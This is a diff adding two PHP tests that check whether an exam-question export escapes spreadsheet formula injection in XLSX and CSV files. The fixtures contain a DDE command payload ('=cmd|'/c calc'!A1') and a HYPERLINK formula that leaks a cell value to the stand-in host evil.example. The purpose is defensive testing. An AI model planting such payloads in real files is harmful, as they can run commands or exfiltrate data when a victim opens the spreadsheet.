@@ -107,6 +107,55 @@ class QuestaoExportTest extends TestCase
         $response->assertSee('1 · Anatomia · AN01', false);
     }
 
+    public function test_neutraliza_valor_com_aparencia_de_formula_no_xlsx(): void
+    {
+        $avaliacao = Avaliacao::create([]);
+        Questao::create([
+            'avaliacao_codigo' => $avaliacao->codigo,
+            'numero' => 1,
+            'gabarito' => 'A',
+            'area' => '=cmd|\'/c calc\'!A1',
+            'tema' => '+SUM(1+1)',
+            'habilidade' => '-2+3',
+            'bloom_nivel' => '@SUM(A1)',
+        ]);
+
+        $response = $this->actingAs($this->admin(), 'admin')
+            ->get(route('avaliacoes.questoes.export.xlsx', $avaliacao));
+
+        $temporario = tempnam(sys_get_temp_dir(), 'xlsx_export_');
+        file_put_contents($temporario, $response->streamedContent());
+
+        $sheet = IOFactory::load($temporario)->getActiveSheet();
+        @unlink($temporario);
+
+        // O apóstrofo na frente faz o Excel/Calc tratar como texto — sem
+        // ele, um =, +, - ou @ no início vira fórmula (e potencial DDE).
+        $this->assertSame("'=cmd|'/c calc'!A1", $sheet->getCell('C2')->getValue());
+        $this->assertSame("'+SUM(1+1)", $sheet->getCell('D2')->getValue());
+        $this->assertSame("'-2+3", $sheet->getCell('E2')->getValue());
+        $this->assertSame("'@SUM(A1)", $sheet->getCell('F2')->getValue());
+    }
+
+    public function test_neutraliza_valor_com_aparencia_de_formula_no_csv(): void
+    {
+        $avaliacao = Avaliacao::create([]);
+        Questao::create([
+            'avaliacao_codigo' => $avaliacao->codigo,
+            'numero' => 1,
+            'gabarito' => 'A',
+            'area' => '=HYPERLINK("http://evil.example/"&A1,"clique")',
+        ]);
+
+        $response = $this->actingAs($this->admin(), 'admin')
+            ->get(route('avaliacoes.questoes.export.csv', $avaliacao));
+
+        $conteudo = $response->streamedContent();
+
+        $this->assertStringNotContainsString('"=HYPERLINK', $conteudo);
+        $this->assertStringContainsString("\"'=HYPERLINK", $conteudo);
+    }
+
     public function test_guest_nao_acessa_exportacao(): void
     {
         $this->admin();
